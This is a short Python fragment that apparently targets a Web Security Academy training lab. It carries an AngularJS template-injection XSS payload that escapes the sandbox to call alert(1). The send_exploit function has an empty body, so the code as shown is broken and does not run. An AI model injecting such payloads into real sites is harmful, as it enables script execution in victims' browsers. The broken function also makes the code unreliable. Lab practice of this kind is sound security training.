import requests

def send_exploit(url, payload):
  

# Пример использования
if __name__ == "__main__":
    target_url = "https://LAB-ID.web-security-academy.net/"
    xss_payload = "{{ $on.constructor('alert(1)')() }}"
    send_exploit(target_url, xss_payload)
